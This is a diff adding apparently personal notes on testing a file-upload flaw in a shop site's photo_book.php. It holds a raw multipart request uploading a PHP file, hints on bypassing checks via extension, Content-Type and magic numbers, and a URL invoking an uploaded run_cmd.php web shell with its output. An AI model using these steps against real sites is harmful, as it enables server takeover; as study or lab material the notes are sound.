@@ -1,0 +1,47 @@
+POST /photo_book.php HTTP/1.1
+Host: shop.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------68811281830323740832176216836
+Content-Length: 376
+Origin: http://shop.com
+Connection: close
+Referer: http://shop.com/photo_book.php
+Upgrade-Insecure-Requests: 1
+Priority: u=1
+Pragma: no-cache
+Cache-Control: no-cache
+
+-----------------------------68811281830323740832176216836
+Content-Disposition: form-data; name="aaa"
+
+bbb
+-----------------------------68811281830323740832176216836
+Content-Disposition: form-data; name="photo"; filename="test.php"
+Content-Type: application/octet-stream
+
+<?php
+
+echo 'This is a test.';
+-----------------------------68811281830323740832176216836--
+
+filename="test.php" .php
+Content-Type: application/octet-stream   image/jpeg image/png
+魔数 magic numbers
+
+http://shop.com/photo_book/140359537366604d10477d3-run_cmd.php?cmd=pwd
+
+/web/shop-com/photo_book
+
+/web/shop-com
+
+zip
+
+主流文件上传框架
+
+
+
+
+
